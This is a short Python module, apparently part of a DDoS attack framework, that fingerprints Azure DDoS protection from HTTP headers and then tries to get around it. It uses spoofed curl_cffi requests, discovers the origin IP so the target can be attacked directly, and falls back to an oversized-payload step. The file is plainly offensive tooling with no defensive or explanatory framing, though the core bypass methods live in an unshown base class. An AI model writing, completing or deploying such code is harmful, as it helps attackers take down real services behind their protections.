"""
Azure Ddos bypass module 2026.
Generated: auto-detection + curl_cffi bypass + origin discovery.
"""
import asyncio, logging, socket
from typing import Optional, Dict
from core.bypass.bypass_base import BaseBypass

logger = logging.getLogger(__name__)

class AzureDdosBypass(BaseBypass):
    """Bypass module for Azure Ddos."""

    @staticmethod
    def detect(headers: dict) -> bool:
        if not headers:
            return False
        h = {k.lower(): v.lower() for k, v in headers.items()}
        if "x-azure" in h or "x-ms" in h:
            return True
        server = h.get("server", "")
        if "azure" in server:
            return True
        return False

    async def find_origin(self, hostname: str, env: dict = None) -> Optional[str]:
        """DDoS bypass: find origin IP, attack direct."""
        return await super().find_origin(hostname, env)

    async def bypass(self, hostname: str, env: dict = None, proxy_url: Optional[str] = None) -> Dict:
        url = f"https://{hostname}/"
        # Step 1: Try direct curl_cffi
        result = await self.bypass_with_curl_cffi(url, proxy_url)
        if result.get("success"):
            return result
        # Step 2: Find origin IP
        origin = await self.find_origin(hostname, env)
        if origin:
            return {"success": True, "origin_ip": origin, "method": "origin_discovery"}
        # Step 3: Oversized payload
        return await self.bypass_with_oversized_payload(url, proxy_url=proxy_url)
